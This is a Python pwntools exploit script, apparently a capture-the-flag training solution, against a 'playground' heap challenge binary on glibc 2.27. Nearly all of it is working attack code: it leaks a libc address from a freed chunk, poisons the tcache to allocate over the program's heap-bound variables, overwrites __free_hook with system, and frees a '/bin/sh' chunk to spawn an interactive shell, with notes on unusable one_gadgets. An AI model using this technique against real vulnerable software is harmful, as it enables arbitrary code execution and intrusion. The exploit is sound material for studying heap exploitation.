from pwn import *

# This program allows you to allocate and free chunks, print content of any memory location and to write everywhere inside the boundaries given by the two variables min_heap and max_heap, set respectively to the start address if the heap and 4096 Bytes above min_heap.

CHALL_PATH = './playground_patch'
CHALL = ELF(CHALL_PATH, checksec=False)
LIBC = ELF('../../env/libc-2.27.so', checksec=False)
COMMANDS = '''
b main
brva 0x1349 
brva 0x13A0
brva 0x146A
brva 0x1551
c
'''

def malloc(c, size) :
    c.recvuntil(b'> ')
    c.sendline(b'malloc ' + str(size).encode('utf-8'))
    answ = c.recvline(keepends=False)
    answ = int(answ.split(b'==> ')[1], 0x10)
    return answ

def free(c, addr, recv=True) :
    print('Free ', end='')
    c.recvuntil(b'> ')
    c.sendline(b'free ' + str(addr).encode('utf-8'))
    
    if recv:
        print(c.recvline().decode('utf-8'), end='')

def show(c, addr, n) :
    print('Show:')
    c.recvuntil(b'> ')
    c.sendline(b'show ' + str(addr).encode('utf-8') + b' ' + str(n).encode('utf-8'))
    res = []

    for i in range(n) :
        answ = c.recvline(keepends=False).decode('utf-8')
        print('    ' + answ)
        res.append(answ)

    return res

def write(c, addr, msg) :
    c.recvuntil(b'> ')
    c.sendline(b'write ' + str(addr).encode('utf-8') + b' ' + str(len(msg)).encode('utf-8'))
    answ = c.recvline(keepends=False)

    if b'read' in answ :
        c.send(msg)
        print(c.recvline(keepends=False).decode('utf-8'))
    else :
        print(answ.decode('utf-8'))

if args.REMOTE:
    c = remote('playground.training.offensivedefensive.it', 8080, ssl=True)
elif args.GDB:
    c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    print(c.recvline(keepends=False).decode('utf-8'))
else:
    c = process(CHALL_PATH)

pid = c.recvline(keepends=False).split(b'pid: ')[1]
main = c.recvline(keepends=False).split(b'main: ')[1]
pid = int(pid)
main = int(main, 0x10)
CHALL.address = main - CHALL.sym['main']
max_heap = CHALL.sym['max_heap']
print(f'pid: {pid}')
print(f'main: {hex(main)}')
print(f'Binary address: {hex(CHALL.address)}')
print(f'max_heap addr: {hex(max_heap)}')
print(f'min_heap addr: {hex(max_heap + 8)}')

# Preparing to leak libc address
chunk = malloc(c, 0x500)
print(f'First chunk: {hex(chunk)}')
malloc(c, 0x10)
free(c, chunk)

# Leaking libc address and computing __free_hook one
addr = show(c, chunk, 1)[0].split(':   ')[1]
LIBC.address = int(addr, 0x10) - 0x3EBCA0
print(f'LIBC base: {hex(LIBC.address)}')
free_hook = LIBC.sym['__free_hook']
print('free_hook addr: ', hex(free_hook))

# Arbitrary chunk allocation attack s.t. new chunk size is written over min_heap, so we can then overwrite max_heap with the address of __free_hook
malloc(c, 0x500)                    # filling that chunk again (otherwise makes problems)
chunk = malloc(c, 0x20)             # new chunk for arbitrary chunk allocation
free(c, chunk)
write(c, chunk, p64(max_heap))      # this will make the chunk size overwrite min_heap
chunk = malloc(c, 0x20)             # emptying the fastbin list
malloc(c, 0x20)                     # allocating over max_heap to overwrite min_heap

write(c, max_heap, p64(free_hook + 0x1000))     # overwriting max_heap with the address of __free_hook
write(c, free_hook, p64(LIBC.sym["system"]))    # writing system address over __free_hook

write(c, chunk, b'/bin/sh\x00')
free(c, chunk, recv=False)          # calling free(chunk) => system("/bin/sh")

c.interactive()

# Libc one_gadgets:
# 0x4f3ce
# 0x4f3d5
# 0x4f432
# 0x10a41c
# Cannot use any gadget because:
# + the first two require last nibble of rsp equal to 0, but last nibble of rsp is 8 with both malloc and free
# + the last two require respectively rsp+0x40 and rsp+0x70 to be null, but this is never true